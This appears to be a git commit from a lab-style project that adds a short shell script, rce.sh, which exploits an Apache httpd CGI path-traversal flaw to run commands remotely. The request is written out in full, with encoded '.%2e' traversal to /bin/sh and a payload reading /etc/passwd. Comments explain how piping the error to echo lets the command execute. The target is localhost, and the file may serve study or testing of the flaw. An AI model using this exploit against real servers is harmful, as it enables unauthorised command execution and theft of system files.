2399c04b30d01b1ef686a9a47e7883a245d90e71
japraj <japraj@live.ca>
2023-02-05 11:47:13 -0800

    get httpd exploit working

---
+++ env/httpd-rce/rce.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+host='localhost:3000'
+payload="cat /etc/passwd"
+curl "$host/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "A= | echo; $payload"
+# The command that runs on the remote machine is:
+# '/bin/sh A=|echo; $payload' (this is based on CGI scripting conventions). The "A="" part will cause an
+# error "A=: No such file or directory", and when we pipe that to echo with " | echo", this can be thought of as 
+# "consuming" the error, which prevents it from being made visible to httpd, so our subsequent payload command
+# gets a chance to execute (if we didn't consume the error, we get a 500 result)
